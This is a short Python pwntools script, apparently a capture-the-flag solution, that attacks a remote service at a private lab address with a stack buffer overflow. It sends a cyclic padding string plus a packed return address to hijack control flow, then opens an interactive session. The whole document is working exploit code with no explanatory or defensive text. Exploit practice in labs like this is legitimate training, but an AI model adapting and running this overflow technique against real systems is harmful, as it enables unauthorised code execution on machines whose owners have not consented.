from pwn import *

#context(arch = 'i386', os = 'linux', endian = 'little', word_size = 32, log_level = 'debug')
#context(arch = 'i386', os = 'linux', endian = 'little', word_size = 32)

#binary = './baby'
#p = process(binary,stdin=process.PTY)

# Remote
HOST = '10.0.0.22'
PORT = 7802
p = remote(HOST, PORT)

#tex=p.recv(timeout=0.5)
tex=p.recvuntil('Ready to smash? Send me data!')
print tex

overflow = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5"
#addr = 0x080489b8
addr = 0x80484fb 
overflow += p32(addr)

print("[*] sending overflow..")
p.sendline(overflow)
print("[*] done.")

#flag = p.recvall()
#print("[*] output: " + flag)
#p.clean()
#p.close()
p.interactive()
